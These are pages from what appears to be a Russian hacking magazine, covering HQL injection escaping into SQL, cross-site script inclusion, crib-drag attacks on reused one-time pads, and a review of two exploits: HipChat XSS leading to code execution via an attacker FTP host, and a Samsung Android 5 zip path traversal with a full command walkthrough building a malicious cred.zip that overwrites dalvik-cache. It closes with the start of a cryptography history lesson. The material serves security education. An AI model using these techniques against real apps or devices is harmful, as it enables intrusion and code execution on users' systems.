  Для экономии времени и усилий придуманы ORM-фреймворки. Они до-
бавляют некую прослойку, и нам остается работать в рамках ООП: создаем,
меняем и удаляем объекты и можем быть уверены, что БД будет отражать их
состояние.





Маппинг простейшего класса

Hibernate — это ORM-фреймворк для Java, и он феноменально популярен.
При этом Hibernate — громоздкая и сложная для понимания вещь (впрочем,
программистам на Java не привыкать). Для нас же интересно, что имеется ти-
повой подход к взлому. Но для его понимания мне придется в двух словах рас-
сказать, как работает Hibernate.
  Первым делом формируются сущности, которые будут храниться в базе
данных. Это так называемые persistent-классы. Далее необходимо связать эти
классы с таблицами в базе данных и определить их отношения («один ко мно-
гим», «многие ко многим»). Выглядит это примерно следующим образом (при
использовании XML-файла, можно и аннотации юзать).
   Как мы видим, мы указываем связь класса (Good — товар) с определенной
таблицей (Goods). А далее — имен полей класса с одноименными столбцами
таблицы с указанием типов (ID товара, название и его цена).
  После этого нужно отредактировать файл hibernate.cfg.xml, в котором хра-
нится информация по подключению. Еще один плюс Hibernate в том, что он сам
будет менять SQL-запросы в зависимости от того, какая СУБД используется (а
для нас это еще одно из мест, где могут быть креды от СУБД), — код приложе-
ния при этом остается неизменным.
  Далее мы можем сохранять, обновлять или искать объекты простейшими
командами:





где session — это объект сессии для работы с Hibernate.
  Но это простейшие действия. Для чего-то более сложного есть возмож-
ность использовать Hibernate Query Language (а можно и нативный SQL).
HQL чем-то похож на SQL, и запрос на нем выглядит примерно следующим
образом.



Здесь мы ищем объект, у которого в названии есть строка any_string. За-
меть, что здесь мы работаем с сущностями не баз данных (таблицы, столбцы),
а классов (имя класса — Good, а не как у таблицы — Goods).
  Запросы на HQL могут быть сложнее, но все равно они не уходят дальше
типовых операций (select, update, delete и подобные). То есть здесь нет воз-
можности вызывать какие-то процедуры или функции СУБД.
  Важно еще раз подчеркнуть, что, используя Hibernate, мы работаем с объ-
ектами и классами, а фреймворк сам смотрит маппинг и отправляет в СУБД
SQL-запросы на выборку или изменение данных.
   Как и с SQL, при работе с HQL-запросами есть два подхода. Первый — это
обычные запросы, когда запрос и пользовательские данные смешиваются.
Второй — это параметризированные запросы, в них данные не смешиваются
с командами, так как передаются отдельно.





И хотя второй вариант настолько распространен (в случае как SQL, так и HQL),
что даже создается ложное впечатление, будто в приложениях на Java не мо-
жет быть SQL-инъекций, первый вариант все же встречается.
   Что же мы можем сделать, если получится подпихнуть свои данные в за-
прос? Во-первых, по аналогии с SQL мы можем поползать по данным других
объектов. Здесь можно найти примеры, вот один из них.





Предполагается, что есть persistence-классы Book и User. Мы можем вставить
нашу строку в like. Так как в HQL запрещен union select, можно вытягивать
данные подзапросами. То есть мы можем ползать по всем данным объектов
persistence-классов.
   Есть и тулза, которая в этом поможет, — HQLmap. Она позволяет автомати-
зировать процесс раскрутки таких HQL.
  Но все это детские игры. Самое лакомое было презентовано компанией
SynAcktiv на недавней конференции. Исследователи обнаружили возможность
вывалиться из HQL в SQL и получить полноценную SQL injection, с которой уже
понятно, что делать.
   Чтобы разобраться, как это происходит, нужно знать, как работает преоб-
разование HQL в SQL. Предположим, у нас есть запрос



Он транслируется в следующий код на SQL:
Здесь все понятно и логично. Но между SQL и HQL есть разница в тонкостях
синтаксиса. В HQL слеш (\) не является специальным символом для экрани-
рования других символов в SQL. Вместо этого в HQL для экранирования ка-
вычки используется еще одна одинарная кавычка. Объединив знания об этих
фактах, можно сделать такой запрос, который будет валидным HQL-запросом,
но после преобразования в SQL вывалится из полученного SQL-запроса.



Как видишь, мы добавили слеш и две одинарные кавычки. Но для HQL кавычка
экранирует другую кавычку. Выходит, что мы не вываливаемся из HQL-выраже-
ния. А потому имеем валидный HQL-запрос.





После конвертации в SQL слеш экранирует первую из двух одинарных кавычек,
и мы вываливаемся из SQL-выражения без генерации ошибок парсером (ему
могли бы не понравиться две последовательные кавычки). Хвост мы, конечно,
отрезаем комментарием (#).
   Вот как в итоге будет выглядеть запрос на SQL:





Магия сработала, мы превратили HQL-инъекцию в классическую SQL.
  Спасибо за внимание и успешных познаний нового!
КАК ДОБЫТЬ ДАННЫЕ
ЧЕРЕЗ CROSS SITE SCRIPTING INCLUSION
На недавнем Black Hat была занятная презентация про возможность получе-
ния различной информации со сторонних сайтов с помощью простой атаки —
Cross Site Scripting Inclusion (XSSI).
   Если ты читаешь Easy Hack систематически, то, наверное, уже хорошо зна-
ком с Same Origin Policy (SOP), мы к нему часто возвращаемся. Из-за SOP воз-
можность взаимодействия между двумя «сайтами» очень ограничена. Но так
как задача получения и оправки информации на одном сайте с другого воз-
никает часто, то были внедрены различные методы для «смягчения» политики
и организации взаимодействия. Например, такие, как CORS или crossdomain.
xml. Один из более старых методов — подгрузка JavaScript с другого доме-
на через тег <script>. SOP нас здесь ничем не ограничивает: можно указать
практически произвольное месторасположение.
  К примеру, есть хост атакующего evil.ru и сайт жертвы — victim.com. На evil.
ru мы можем положить файл HTML и сослаться на любой скрипт у жертвы:



При входе пользователя на сайт атакующего браузер подгрузит и запустит JS
с victim.com, но в контексте SOP evil.ru. Это значит, что из JS самого атакующе-
го мы сможем получить доступ к данным (не всем) JS с сервера жертвы.
   Например, содержимое JS c cайта-жертвы (http://victim.com/any_script_.js):



Тогда на сайте атакующего мы можем получить значение переменной:




Идея работы проста, как алюминиевый чайник.
  По сути, возможность подгружать с других сайтов статический JS несет
в себе не больше проблем для сайта-жертвы, чем погрузка картинки.
  Проблемы могут возникнуть, когда JS формируется динамически, то есть
когда контент JS-скрипта меняется на основании данных из cookie в зависи-
мости от того, какой пользователь к нему обращается. Например, в JS хра-
нится какая-то «критичная» информация: персональные сведения (email, имя
пользователя на сайте-жертве) или техническая инфа (анти CSRF-токены).
   Но, как мы знаем, при подгрузке скрипта через тег <script> браузер поль-
зователя автоматически отправляет cookie пользователя. Сложив эти факты,
мы получаем возможность получать информацию о любом пользователе, ко-
торый зашел на сайт атакующего и при этом залогинен на сайте-жертве.
   Что же мы можем узнать? Глобальные переменные и результаты работы гло-
бальных функций. К сожалению, доступа к внутренним переменным/функциям
нам не получить (хотя, возможно, кто-то найдет способ сделать и это).





Такая атака выглядит возможной, но кажется, что она слишком проста и не долж-
на быть распространенной. Этим и интересна презентация на Black Hat. Ис-
следователи проанализировали 150 популярных сайтов и обнаружили, что
в той или иной мере уязвима треть из них. Такая статистика заставляет взгля-
нуть на проблему чуть более пристально.
  Была выявлена и еще одна закономерность. Content Security Policy стано-
вится все более распространенной. Как ты знаешь, с ней мы можем указать,
с каких доменов может быть подгружен тот или иной ресурс. Например, можно
сказать исполнять JS только с того же ресурса. Кроме того, лучшие практики
настройки CSP подразумевают запрет на запуск inline JS (то есть кода, кото-
рый находится прямо в HTML, а не подгружен из JS-файла).
   Однако перенос inline в файлы может быть сделан с костылями и на скорую
руку — то есть посредством динамически генерируемых скриптов. Так как CSP
никак не влияет на XSSI, мы опять-таки можем проводить наши атаки. Вот такая
вот bad practice.
АТАКА НА ONE-TIME PAD С ПОМОЩЬЮ CRIB DRAG

Немного веселой криптографии никогда не повредит, так что давай разберем-
ся с одной из относительно простых, но юзабельных атак на так называемый
двухразовый блокнот (two-time pad). Сначала, впрочем, пройдемся по терми-
нологии и принципам работы шифра.
  Одноразовый блокнот, или one-time pad (OTP), — это такой «поточный»
шифр. Его суть сводится к тому, что исходные данные просто ксорятся (XOR)
со случайным ключом. При этом ключ должен быть такой же длины, что и дан-
ные, и никогда повторно не использоваться. И все. Полученный текст зашиф-
рован, и расшифровать его без ключа никто не сможет.
   Как видишь, идея проста, но при этом надежна. Однако у этого шифра есть
серьезный минус — ключ не должен повторяться (есть, конечно, и другие ми-
нусы, такие как проблемы распространения ключей, но для нашей задачки это
не важно). Проблема усугубляется, когда необходимо часто передавать дан-
ные или данных много (например, когда этот метод шифрования используется
в каком-нибудь сетевом протоколе). Если ключ применялся повторно, то воз-
никает ситуация two-time pad — «блокнот» используется два и более раз. Если
атакующий перехватил два сообщения, которые зашифрованы одним ключом,
то он может попытаться провести атаку Crib Drag. Чтобы понять ее идею, давай
пройдемся по всем пунктам шифрования данных.
   Итак, у нас есть:

M1, M2 — первое и второе незашифрованные (изначальные) сообщения;
C1, C2 — первое и второе зашифрованные сообщения, известные
         атакующему;
K — ключ, который используется для шифрования обоих сообщений.

Сообщения же шифруются следующим образом:

C1 = M1^K
C2 = M2^K

Как ты знаешь, XOR — это простейшая операция и, что важно, «обратимая»:

K = C1^M1
K = C2^M2

Получаем что-то вроде классического уравнения. Соединим части вместе:

C1^M1 = C2^M2
Проще не стало. Но давай вспомним, что C1 и C2 известны атакующему, и све-
дем все в одну сторону:

M1 = C1^C2^M2

Итого — мы видим, что любое из изначальных сообщений является результа-
том XOR С1, С2 и M2. «Уравнение» выглядит нерешаемым, но это не всегда так.
   Возможность расшифровки сообщений требует от нас некоторых допуще-
ний и воображения. Но для начала необходимо вспомнить, что XOR — это по-
битовая операция. То, что мы ксорим одни байты, не влияет на другие байты.
  Допущение заключается в том, что нам хоть что-то известно про передава-
емые данные. Простейший вариант — мы предполагаем, что в сообщениях пе-
редается какой-то текст. Тогда внутри сообщений будут строчные и заглавные
буквы, а также пробелы.
  А теперь сама атака. Изначально мы имеем результат XOR C1 и C2 (для про-
стоты назовем С12), а также предполагаем какое-то значение в M2 и ксорим его
С12. При этом мы помним, что в M2 мы используем только буквы, но что важ-
нее — в результате ксора M2 и С12 тоже должны быть буквы. Если их нет и мы
видим какие-то другие символы, следовательно, предполагаемое значение от-
сутствует в изначальном сообщении (и в M1, и в M2) или оно находится в другой
позиции. Таким образом, мы можем значительно сократить количество вариа-
ций. Остается добавить, что человеческие языки тоже не отличаются абсолют-
ной рандомностью: имея часть слова, мы можем с определенной точностью
предположить его окончание; какие-то буквы появляются чаще, чем другие.
  Пример можно еще больше упростить. Мы можем брать последовательно
все буквы и подставлять во все позиции сообщения. Например, буква а:

M1[i]= С12[i]^’a’

Если в результате (M1i () мы видим не букву, то мы можем быть уверены, что
ни в M1, ни в M2 в этой позиции (i) нет буквы а.
  С практической точки зрения этот пример может показаться нереалистич-
ным. Но это не совсем так. При передаче большого количества данных повто-
ры ключей случаются чаще, чем хотелось бы. Тогда атака превращается в many
time pad, что еще больше сокращает вариативность изначальных данных. Эта
техника, в частности, применяется для атак на протоколы PPTP и WEP.
  К тому же данная атака может быть использована и в «обратном» виде, ког-
да у нас есть одно сообщение, но с разными ключами. В таком случае она бу-
дет нацелена на получение значения ключа.
Взлом





                                                                              Борис Рютин,
                                                                                                     ZORSecurity
                                                                                                                b.ryutin@tzor.ru
                                                                                      @dukebarman
     WARNING                                                                                                dukebarman.pro

       Вся информация
     предоставлена исклю-
       чительно в ознако-
       мительных целях.
    Ни редакция, ни автор
     не несут ответственно-
      сти за любой возмож-
    ный вред, причиненный
     материалами данной
             статьи.

ОБЗОР
ЭКСПЛОЙТОВ
АНАЛИЗ СВЕЖЕНЬКИХ УЯЗВИМОСТЕЙ
     Сегодня мы разберем две уязвимости, которые позволяют
  исполнять произвольный код, хотя изначально не подразумевали
   такой возможности. Одна была найдена в клиентах популярного
   сервиса HipChat и вроде бы считалась обычной XSS. Другая же
   была обнаружена в одном из приложений, предустановленных
           на устройствах с Android компании Samsung.




ОТ XSS ДО RCE В ATLASSIAN HIPCHAT

 CVSSv2:      N/A
 Дата релиза: 12 ноября 2015 года
 Автор:        Matt Austin
 CVE:         N/A

Atlassian HipChat представляет собой веб-сервис для общения как внутри ко-
манды, так и один на один. Причина его популярности — плотная интеграция
с остальными продуктами Atlassian, а также с другими популярными сервиса-
ми для разработчиков (GitHub, Heroku и подобными).
  Для рендеринга таких объектов, как изображения, видео и смайлы, клиент
HipChat использует встроенный движок WebKit. В клиентах для OS X, Windows
и iOS при обработке URL-адресов текст, содержащий javascript:, неправиль-
но конвертируется и превращается в ссылки. Несмотря на то, что это обычная
уязвимость типа XSS, в нашем случае она, благодаря тому что позволяет по-
лучить доступ к локальным файлам, приводит к удаленному выполнению кода.
   Клиент изучает входящие сообщения на наличие данных, которые нуж-
но обработать. К примеру, он поддерживает популярные протоколы, такие
как http://, ftp:// и file://. Помимо этого, парсер обрабатывает любую кон-
струкцию типа любое_слово:// или любое_слово:/любое_слово и превращает
ее в кликабельную ссылку.
  В связи с этим возникает небольшая проблема: так как обработчик ждет
символ / после двоеточия, то наш JavaScript-код будет начинаться с /. Реше-
ние — добавить второй слеш и символ перевода на новую строку. В результа-
те мы получим строку с комментарием и за ним строку с нашим кодом.


Продолжим анализ. Когда мы кликаем ссылку, HipChat пытается ее открыть
с помощью браузера, установленного по умолчанию. Это происходит, потому
что ссылка передается операционной системе. То есть, нажав на ссылку вида
http://..., мы в большинстве случаев откроем ее в веб-браузере. Но что про-
изойдет с file://? Система запустит его. В итоге мы можем с помощью XSS
выполнить приложение.


К сожалению, это будет работать только с приложениями на удаленном ком-
пьютере и не позволяет нам передать аргументы.

EXPLOIT
Получается, что нам нужно запустить или собственное приложение, или скрипт,
то есть необходим файл, который можно контролировать и который находится
в известном месте.
  В этом нам поможет особенность обработки FTP-ссылок. Если такая ссыл-
ка содержит имя пользователя и пароль, то OS X, к примеру, автоматически
подключится к FTP и смонтирует его как отдельный раздел.
   Соединяемся, к примеру, с ftp://anonymous:x@104.131.88.251/. В случае
успеха получим file:///Volumes/104.131.88.251/.
  В итоге получим следующий эксплоит.





Пример успешного запуска эксплоита для уязвимости в HipChat на OS
Файл с расширением terminal используется не зря. У приложения Terminal.app
есть файл с настройками с возможностью указать команду запуска. Это нужно
для выполнения чего-либо в обход некоторых требований (права выполнения,
различные подписи кода) в стандартных shell-скриптах. Hack.app также нахо-
дится в этой директории и будет выполнен.





На мобильных же устройствах мы имеем XSS, но не выполнение кода. С по-
мощью XSS мы можем выполнить XHR-запрос к локальным файлам системы,
используя file://. А воспользовавшись недоработками в Same Origin Policy
встроенного движка WebKit, сможем отправить на удаленный адрес второй
AJAX-запрос с нужными нам данными. Это позволяет атакующему украсть
любые локальные документы, такие как файлы с настройками, кешированные
файлы, cookies или логи чатов. Это работает как в iOS, так и в OS X.
   Закодированная ссылка:





Оригинальный текст:
Автор также опубликовал демонстрацион-
ное видео, а все указанные выше скрипты
доступны на GitHub.

TARGETS
Протестировано на Atlassian HipChat OS
X 3.0.6 (132) и iOS 2.3.3 (20307). В версиях
ниже и под другие платформы также воз-
можно совершить атаку.

SOLUTION
Есть исправление от производителя.





                                            Раскрытие файлов в HipChat-клиенте
                                           для iOS-устройств
УДАЛЕННОЕ ВЫПОЛНЕНИЕ КОДА
В УСТРОЙСТВАХ SAMSUNG С ANDROID 5

 CVSSv2:      N/A
 Дата релиза: 12 ноября 2015 года
 Автор:        Google’s Project Zero team, Quarkslab
 CVE:         N/A

В устройствах Samsung, использующих Android 5, есть Android-приложение, ко-
торое наблюдает за файловыми операциями в директории /sdcard/Download/.
Для этого используется FileObserver, механизм, основанный на уведомле-
ниях. Когда имя файла начинается с cred, заканчивается на .zip и находится
в указанной выше директории, то вызывается unzip для этого архива. После
успешного завершения процесса разархивации сам архив удаляется. Unzip
извлекает файлы из cred[something].zip в /data/bundle/.
  При этом нет никакой проверки имен извлекаемых файлов, что позволя-
ет нам создать файл, начинающийся, к примеру, с ../, который запишется вне
директории /data/bundle/. В итоге атакующий может записать произвольные
данные в любое место в системе, имея права доступа system. Помимо это-
го, путь /sdcard/Download является директорией по умолчанию для Google
Chrome и встроенного браузера, по тому же пути сохраняются и вложения
из писем в Gmail, так что получаем еще и возможность удаленного выполнения
кода на устройстве.
  Разберем уязвимость подробнее. В качестве тестового устройства возь-
мем Samsung Galaxy S6.
   Уязвимый код находится в приложении Hs20Settings.apk. Оно регистри-
рует BroadcastReceiver с именем WifiHs20BroadcastReceiver, который выпол-
няется при загрузке и при различных Wi-Fi-событиях (android.net.wifi.STATE_
CHANGE).
   Отмечу, что уязвимый код может находиться где угодно на разных устрой-
ствах Samsung. К примеру, в Samsung Galaxy S5 он находится в приложении
SecSettings.apk.
   Когда BroadcastReceiver срабатывает на одном из указанных событий, то
выполняется следующий код.
На  каждое  полученное  событие  Intent  создает  сервис  с  именем
WifiHs20UtilityService. И если попытаться найти «конструктор» этого серви-
са, а именно метод onCreate(), то мы найдем процесс создания нового объ-
екта WifiHs20CredFileObserver.





WifiHs20CredFileObserver определен как Java-подкласс FileObserver:



Обратимся к документации по классу FileObserver: «FileObserver — это аб-
страктный класс, наследуемые классы которого должны реализовывать обра-
ботчик событий onEvent(int, String). Каждый экземпляр FileObserver наблюдает
за одним файлом или директорией. Если директория мониторится, то событие
срабатывает для всех файлов и поддиректорий внутри нее. Маска в событи-
ях используется, чтобы указать, какие изменения или действия были сделаны.
Константы типа события в масках используются для описания возможных из-
менений».
   Публичный конструктор должен указать путь и маску для наблюдаемых со-
бытий.



В нашем же случае конструктор для WifiHs20CredFileObserver.





В коде, представленном выше, FileObserver наблюдает за всеми возможны-
ми типами событий для директории /sdcard/Download/, так как маска 0xFFF
является константой FileObserver.ALL_EVENTS. Чтобы понять, когда событие
будет получено, рассмотрим переопределенный метод onEvent() в классе
WifiHs20CredFileObserver.

Когда мы получаем тип события, равный 8 (FileObserver.CLOSE_WRITE), сра-
батывают некоторые проверки для имени файла. Если имя файла начинает-
ся с cred и заканчивается на .conf или .zip, то он начинает обрабатываться.
В остальных случаях FileObserver игнорирует его.
   Когда интересующий файл записывается в наблюдаемую директорию, мо-
гут быть выполнены два сценария:
•  Если это conf-файл, то сервис читает его, используя readSdcard(), затем
   конфигурация передается в WifiManager.modifyPasspointCred(). После вы-
   зова readSdcard() файл .conf удаляется.
•  Если это zip, то сервис извлекает файлы в /data/bundle/ и вызывает
   loadCred() для обработки содержимого извлеченного файла cred.conf.
   Затем вызывается WifiManager.callSECApi() с полученным результатом
   из loadCred(), в виде аргумента внутри объекта Bundle. Изначальный ар-
   хив zip удаляется после операции unzip.

Первый сценарий нам неинтересен, но вот второй... Операция unzip исполь-
зует стандартный класс ZipInputStream, который имеет известную проблему:
если отсутствует проверка имен файлов внутри архива, то можно получить об-
ход директорий. Уязвимость схожа с одной из ранее опубликованных иссле-
дователем @fuzion24 в функции обновления приложения Samsung Keyboard.
  Ниже представлен подчищенный код функции unzip(). Для читабельности
были также удалены вставки try/catch.
Теперь мы сами видим, что никакой проверки на обход директории нет. Та-
ким образом, если файл cred.zip или cred[something].zip будет записан в /
sdcard/Download/, WifiHs20CredFileObserver автоматически распакует содер-
жимое в /data/bundle/ и удалит ненужный архив. И если любой распакованный
файл содержит ../, то выйдет за пределы указанной директории и запишется
с правами system.
   Теперь разберем, как это можно превратить в выполнение кода.

EXPLOIT
Для начала создадим архив с произвольным именем. Воспользуемся Python.
Так как же получить выполнение кода, если у нас есть возможность писать
файлы с такими правами? Одно из решений — это переписать файлы внутри
dalvik-cache. Но на Android 5 Dalvik VM больше не используется, так как была
заменена на ART. Аналогично ODEX-файлам OAT-файлы генерируются из .apk
с помощью пакетного менеджера, вызывающего dex2oat, и полученные файлы
записываются в директорию /data/dalvik-cache/ с расширением .dex. Одна-
ко мы можем все-таки использовать этот метод для выполнения кода.
  К сожалению (или нет), переписать dalvik-cache для выполнения кода в на-
стоящее время почти невозможно. На последних ROM эта директория при-
надлежит пользователю root и запись в нее ограничена с помощью SELinux.
   Некоторые  Samsung ROM  с  запущенным  Android   5,  такие  как
G900FXXU1BNL9 или G900FXXU1BOB7, не содержат эти правила SELinux
и поэтому уязвимы. То есть в подобных ROM директория dalvik-cache при-
надлежит root, но SELinux не предотвращает перезапись произвольными си-
стемными приложениями файлов в этой директории (которые принадлежат
пользователю system). Мы рассмотрим только этот случай.
  Нам нужно найти такое приложение для перезаписи, которое запущено
также с system uid, и найти, как сгенерировать собственный OAT-файл. Поиск
программы оказался непростой задачей. Важны были три детали.
•  Процесс unzip написан на Java, и распаковка побайтово будет очень мед-
   ленной на больших файлах.
•  Если переписать OAT-файл запущенного приложения, то мы можем вызвать
   его падение. А это будет не совсем скрытно :).
•  У нас должна быть возможность выполнить код из этого приложения.

В итоге нам нужно найти небольшой файл OAT, который не используется. Иде-
альным кандидатом стал следующий файл:

shell@klte:/ $ ls -al /data/dalvik-cache/arm/
    system@app@AccessControl@AccessControl.apk@classes.dex
-rw-r--r-- system   u0_a31000   176560 2015-10-30 15:40
    system@app@AccessControl@AccessControl.apk@classes.dex

Просмотрев manifest приложения, автор смог найти одну из возможностей ав-
тозапуска, зарегистрированной с помощью BroadcastReceiver на обработку
событий android.intent.action.BOOT_COMPLETED.
В результате если мы добавим некий код внутрь метода onReceive() класса
AccessControlReceiver, то наш код будет выполняться каждый раз при запуске
устройства.
   Давай проверим теорию. Для начала нам нужно получить оригинальный
код AccessControl-приложения.

> adb pull /system/app/AccessControl/arm/ .
pull: building file list...
pull: /system/app/AccessControl/arm/AccessControl.odex.xz ->
./AccessControl.odex.xz
pull: /system/app/AccessControl/arm/AccessControl.odex.art.xz ->
./AccessControl.odex.art.xz
2 files pulled. 0 files skipped.
273 KB/s (72428 bytes in 0.258s)
> ls
AccessControl.odex.art.xz  AccessControl.odex.xz
> xz -d *
> file *
AccessControl.odex:     ELF 32-bit LSB  shared object, ARM, EABI5
version 1 (GNU/Linux), dynamically linked, stripped
AccessControl.odex.art: data

В итоге получаем файл ART ELF (OAT), но мы хотим модифицировать байткод
Dalvik. Можем вытащить соответствующий байткод Dalvik с помощью утилиты
oat2dex.

> python oat2dex.py /tmp/art/AccessControl.odex
Processing ‘/tmp/art/AccessControl.odex’
Found DEX signature at offset 0x2004
Got DEX size: 0xe944
Carving to: ‘/tmp/art/AccessControl.odex.0x2004.dex’
> file *
[...]
AccessControl.odex.0x2004.dex: Dalvik dex file version 035
[...]
> baksmali AccessControl.odex.0x2004.dex -o smali

Пропатчим  AccessControlReceiver,  добавив  собственный  код  в  метод
onReceive():

> find smali/ -iname ‘*receiver*’
smali/com/samsung/android/app/accesscontrol/
AccessControlReceiver.smali
> vim smali/com/samsung/android/app/accesscontrol/
    AccessControlReceiver.smali
[...]
.method public onReceive(Landroid/content/Context;
Landroid/content/Intent;)V
  .registers 10
+  # adding the following code:
+  const-string v0, “sh4ka”
+  const-string v1, “boom!”
+  invoke-static {v0, v1}, Landroid/util/Log;->
    wtf(Ljava/lang/String;Ljava/lang/String;)I
[...]
> smali smali/ -o classes.dex

Для перекомпилирования исправленного кода обратно в OAT воспользуем-
ся утилитой dex2oat (https://www.blackhat.com/docs/asia-15/materials/asia-15-
Sabanal-Hiding-Behind-ART.pdf).

> adb pull /system/app/AccessControl/AccessControl.apk .
1462 KB/s (259095 bytes in 0.173s)
> sudo chattr +i AccessControl.apk
> cp AccessControl.apk Modded.apk
> zip -q Modded.apk classes.dex
> python -c ‘print len(“/system/app/
    AccessControl/AccessControl.apk”)’
43
> python -c ‘print 43-len(“/data/local/tmp/Modded.apk”)’
17
> mv Modded.apk Modded$(python -c ‘print “1”*17’).apk
> ls
AccessControl.apk  AccessControl.odex  AccessControl.odex.0x2004.dex
AccessControl.odex.art  classes.dex  Modded11111111111111111.apk
smali
> adb push Modded11111111111111111.apk /data/local/tmp
1144 KB/s (284328 bytes in 0.242s)
> adb shell dex2oat --dex-file=/data/local/tmp/
    Modded11111111111111111.apk --oat-file=/data/local/tmp/modified.oat
> adb pull /data/local/tmp/modified.oat .
1208 KB/s (172464 bytes in 0.139s)
> file modified.oat
modified.oat: ELF 32-bit LSB  shared object, ARM, EABI5 version 1
(GNU/Linux), dynamically linked, stripped
> sed -i ‘s/\/data\/local\/tmp\/Modded11111111111111111.apk/\/
    system\/app\/AccessControl\/AccessControl.apk/g;’ modified.oat

Теперь можем сделать атакующий архив.
> cat injectzip.py
import sys
from zipfile import ZipFile
with ZipFile(“cred.zip”,”w”) as z:
  z.writestr(sys.argv[1],open(sys.argv[2],”rb”).read())
> python injectzip.py ../../../../../../data/dalvik-cache/arm/
    system@app@AccessControl@AccessControl.apk@classes.dex /tmp/
    art/modified.oat
> zipinfo cred.zip
Archive:  cred.zip
Zip file size: 172750 bytes, number of entries: 1
?rw-------  2.0 unx   172464 b- stor 15-Nov-08 18:43
../../../../../../data/dalvik-cache/arm/system@app@AccessControl@
AccessControl.apk@classes.dex
1 file, 172464 bytes uncompressed, 172464 bytes compressed:  0.0%

Получаем три разных вектора атаки:
•  посещения веб-страницы с помощью браузера;
•  загрузка вложения из письма в приложении Gmail;
•  установка вредоносного приложения без прав.

Пример атаки с помощью веб-страницы:.





После открытия страницы перезагрузим устройство и удостоверимся в нали-
чии проверочной строки.

> adb reboot; adb logcat sh4ka:V *:S
- waiting for device -
--------- beginning of system
--------- beginning of main
F/sh4ka   ( 3613): boom!
Оригинальную статью ты можешь прочи-
тать в блоге компании Quarkslab.

TARGETS
Устройства Samsung с ОС Android 5.
  Для  проверки  устройства  советую
воспользоваться   утилитой   команды
Nowsecure — Android Vulnerability Test Suite
(Android  VTS), которую можно исполь-
зовать не только для обнаружения этой
уязвимости. Ее исходники опубликованы
на GitHub, поэтому при желании можешь
изучить поближе.

SOLUTION
Есть исправление от производителя.





                                            Проверка устройства на наличие
                                              уязвимостей с помощью Android VTS
ВЗЛОМ





                                                                        Анастасия БересневаПОГРУЖЕНИЕ
                                                                                     anastasiya3161@gmail.com
            ЧАСТЬ I:В КРИПТУ
ИСТОРИЧЕСКИЕ
ШИФРЫ
КАК РАБОТАЮТ
САМЫЕ ИЗВЕСТНЫЕ
ШИФРЫ В ИСТОРИИ?
ВСЕ НАГЛЯДНО
И ПО ПОЛОЧКАМ!
Архаичные шифраторы канули в Лету, чего нельзя сказать
об алгоритмах шифрования. Операции сдвига, замены
и перестановки до сих пор применяются в современных
алгоритмах, однако с существенной поправкой в стой-
кости. За многие столетия, прошедшие со времен пер-
вого применения этих шифров, криптографы научились
оценивать количество информации, энтропию и стой-
кость, однако так было не всегда. Рассмотрим подробнее,
как работают самые популярные шифры в истории крипто-
графии и в чем их недостатки.

Roadmap

Это первый урок из цикла «Погружение в крипту». Все уроки цикла в хроноло-
гическом порядке:

• Урок 1. Исторические шифры:  основы,  исторические шифраторы,
           как работают (и анализируются) шифры сдвига, замены, Рихарда
           Зорге, шифр Вернама и шифровальные машины (ты здесь)
• Урок 2. Распределение ключей: что это такое, как выполняется распре-
          деление ключей и как выбрать криптостойкий ключ
• Урок 3. Современные отечественные шифры: что такое сеть Фейсте-
             ля, какими бывают отечественные блочные шифры, используемые
           в современных протоколах, — ГОСТ 28147—89, «Кузнечик»
• Урок 4. Современные зарубежные шифры: что такое, как работают
          и в чем разница между 3DES, AES, Blowfish, IDEA, Threefish от Брю-
          са Шнайера
• Урок 5. Электронная подпись: виды ЭП, как они работают и как их ис-
          пользовать
• Урок 6. Квантовая криптография: что это такое, где используется
          и как помогает в распределении секретных ключей, генерации
          случайных чисел и электронной подписи



В современном обществе, где почти каждый человек имеет электронный де-
вайс (а то и не один), где каждую минуту совершаются операции с электрон-
ной валютой, пересылаются конфиденциальные email, подписываются элек-
тронные документы, криптография нужна как воздух. Нужна пользователям,
чтобы защитить свою приватность. Нужна программистам, чтобы обеспечить
безопасность проектируемых систем. Нужна хакерам, чтобы при аудите по-
нимать уязвимые места в системах. Нужна админам, чтобы представлять, чем
и как лучше защищать корпоративные данные. Мы не могли обойти стороной
такую важную тему и начинаем цикл статей, посвященный введению в крипто-
графию. Для новичков — самый простой путь познакомиться с криптой,
для профи — хороший повод систематизировать свои знания. Шесть уроков,
от самого простого к сложному. Вперед!

Термины

Для начала давай определимся с терминологией:
•  Криптография — это наука о том, как обеспечить секретность сообще-
    ния.
•  Криптоанализ — это наука о том, как вскрыть зашифрованное сообще-
    ние, не зная ключа.
•  Дешифровка — это процесс получения открытого текста средствами
   криптоанализа.
•  Расшифрование — это процесс получения открытого текста с использо-
   ванием ключа и алгоритма расшифрования, предусмотренного для данно-
   го шифра.

В мире криптографии путаться в этих словах — ужасный моветон.




ЗАЧЕМ МНЕ ЗНАНИЯ О КРИПТОГРАФИИ?
Предположим, криптография очень нужна, но пусть ей займутся дядьки с уса-
ми математики. Зачем же мне знания по криптографии?
   Если ты обычный пользователь — то как минимум, чтобы обеспечить свою
приватность. Сегодня крупным государствам и влиятельным организациям
становятся доступны средства тотального надзора за миллионами людей.
Поэтому криптография оказывается важнейшим инструментом, обеспечива-
ющим конфиденциальность, доверие, целостность, авторизацию сообщений
и электронных платежей. Повсеместное распространение криптографии оста-
нется одним из немногих способов защитить пользователя от угроз, нависа-
ющих над его конфиденциальной информацией. Зная, как работает тот или
иной протокол или шифр, чем он хорош и где его слабые места, ты сможешь
осознанно выбирать инструменты для работы или просто общения в Сети.
   Если ты программист или специалист по ИБ, то здесь вообще от крипто-
графии никуда не скрыться. Любой крупный проект требует обеспечения без-
опасности информации. Неважно, что ты разрабатываешь: контентный сер-
вис, почтовик, мессенджер, соцсеть или просто интернет-магазин, — везде
есть критичные данные, которые надо защищать от перехвата или угона БД.
Каждая операция должна быть защищена криптографическими протоколами.
В этом случае криптография — подходящий инструмент. Если ты еще с ней
не столкнулся, будь уверен — это на 100% лишь вопрос времени.
   Короче говоря, криптография используется гораздо чаще, чем можно себе
представить. Поэтому пора снять завесу тайны с этой науки, познакомиться
с наиболее интересными аспектами и использовать ее возможности себе
на пользу.

ЗАЧЕМ ИЗУЧАТЬ СТАРЫЕ ШИФРЫ?
В интернете криптографические протоколы используются практически при ка-
ждом запросе. Но как же дело обстояло, когда интернета не было и в помине?
Не стоит думать, что в те далекие лохматые времена не было криптографии.
Первые способы шифрования появились около четырех тысяч лет назад. Ко-
нечно, это были самые примитивные и нестойкие шифры, однако и население
тогда было малограмотное, так что такие способы могли защитить информа-
цию от любопытных глаз.
  Люди всегда нуждались в секретной переписке, поэтому шифрование
не стояло на месте. С раскрытием одних шифров придумывали другие, более
